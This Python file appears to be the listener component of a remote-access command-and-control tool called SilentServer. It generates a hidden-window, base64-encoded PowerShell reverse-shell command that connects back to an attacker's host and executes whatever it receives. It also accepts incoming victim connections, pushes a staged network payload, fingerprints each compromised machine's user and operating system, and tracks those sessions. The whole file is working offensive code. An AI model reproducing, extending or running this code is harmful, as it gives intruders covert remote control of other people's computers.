import socket
import time
import threading
import random
import dataclasses
import base64
import core.Payloads
import core.TextAssets

@dataclasses.dataclass
class ClientStructure:
        client        : object
        client_id     : str
        client_addr   : str
        client_os     : str
        client_user   : str
        client_status : str
        client_usage  : str

class SilentServer:
        def __init__(self, callback_address: str, callback_port: int) -> None:
                self.callback_address   = callback_address
                self.callback_port      = callback_port
                self.listener           = None
                self.manager            = None
                self.server_thread      = None
                self.server_shutdown    = threading.Event()

                self.clients            = []
                self.client_id          = None
                self.client_os          = None
                self.client_user        = None

                self.client             = None

        def get_payload(self) -> str:
                payload                 = ("start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new('"
                                           f"{self.callback_address}"
                                           "',"
                                           f"{str(self.callback_port)}"
                                           ");[io.streamreader]::new($t.getstream()).readline()|iex}")

                payload                 = payload.encode("utf-16le")
                payload                 = base64.b64encode(payload)
                payload                 = payload.decode("ascii")
                payload                 = "powershell -e " + payload

                return payload

        def initialize_server(self) -> bool:
                if self.listener:
                        return False

                self.listener           = socket.socket()
                self.listener.bind(("0.0.0.0", int(self.callback_port)))
                self.listener.listen(socket.SOMAXCONN)

                self.server_thread      = threading.Thread(
                        target          = self.begin_listen,
                        daemon          = True
                )
                self.server_thread.start()

                self.manager            = threading.Thread(
                        target          = self.client_manager,
                        daemon          = True
                )
                self.manager.start()

                return True

        def client_manager(self) -> None:
                while True:
                        time.sleep(1)
                        self.track_clients()

        def track_clients(self) -> None:
                for index, client in enumerate(self.clients):
                        if client.client_status == "Lost" or client.client_usage == "Yes":
                                continue

                        if  not self.peek_client(client.client):
                                client.client_status = "Lost"
                                self.clients[index] = client
                                core.TextAssets.print_lost_client(client, True)

        def peek_client(self, client) -> None:
                try:
                        data            = client.recv(1, socket.MSG_PEEK)
                except ConnectionResetError:
                        return False
                except BlockingIOError:
                        return True
                except OSError:
                        return False

                return data == b""

        def begin_listen(self) -> None:
                while True:
                        try:
                                self.client, address = self.accept_client()
                        except:
                                return None

                        self.client.setblocking(False)

                        if not self.verify_client():
                            self.client.close()
                            continue

                        client_struct   = ClientStructure(
                                client        = self.client,
                                client_id     = self.client_id,
                                client_addr   = address[0],
                                client_os     = self.client_os,
                                client_user   = self.client_user,
                                client_status = "Active",
                                client_usage  = "No"
                        )

                        self.clients.append(client_struct)
                        core.TextAssets.print_client(client_struct)

                        self.client_id        = None
                        self.client_os        = None
                        self.client_user      = None

        def shutdown(self) -> None:
                self.listener.close()
                self.listener           = None
                self.server_shutdown.set()
                self.server_thread      = None

                return True

        def accept_client(self) -> bool:
                try:
                        return self.listener.accept()
                except:
                        return False

        def verify_client(self) -> bool:
                self.client_id          = self.get_client_id()

                if not self.wait_client():
                        if not self.send_payload():
                                return False

                if not self.verify_username():
                        return False

                if not self.client_user:
                        return False

                if self.client_os:
                        return True

                if not self.verify_os():
                        return False

                if not self.client_os:
                        return False

                return True

        def verify_username(self) -> bool:
                self.client.send("whoami\n".encode())
                data                    = self.wait_client().decode()

                if not data:
                        return False

                if "\n" in data:
                        data            = data.split("\n")

                if data[0] == "whoami":
                        data            = data[1:]

                if not isinstance(data, list):
                        data            = [data]

                for potential_data in data:
                        if potential_data.strip("\r"):
                                data    = potential_data.strip("\r")
                                break

                if "\\" in data:
                        self.client_os  = "Windows"
                        user            = data.split("\\")[1]

                else:
                        user            = data

                self.client_user        = user

                return True

        def verify_os(self) -> bool:
                self.client.send("uname\n".encode())
                data                    = self.wait_client().decode()

                if not data:
                        return False

                if "\n" in data:
                        data            = data.split("\n")

                if data[0] == "uname":
                        data            = data[1:]

                if not isinstance(data, list):
                        data            = [data]

                for potential_data in data:
                        if potential_data.strip("\r"):
                                data    = potential_data.strip("\r")
                                break

                self.client_os          = data

                return True


        def send_payload(self) -> bool:
                self.client.send(f"$w=[io.streamwriter]::new($t.getstream());$w.write('{self.client_id}');$w.flush();[io.streamreader]::new($t.getstream()).readline()|iex\n".encode())
                data                    = self.wait_client().decode()

                if not data:
                        return False

                if data != self.client_id:
                        return False

                self.client.send(core.Payloads.NETWORK_PAYLOAD.encode())

                return self.wait_client()

        def wait_client(self) -> bool:
                data                    = b""

                for wait_iteration in range(50):
                        try:
                                data    = self.client.recv(1024)
                                break
                        except BlockingIOError:
                                time.sleep(0.1)

                return data

        def get_client_id(self) -> str:
                client_id               = []

                for _ in range(3):
                        bits            = random.getrandbits(16)
                        bits_string     = "{:04x}".format(bits)
                        client_id.append(bits_string)

                client_id               = "-".join(client_id).upper()

                return client_id
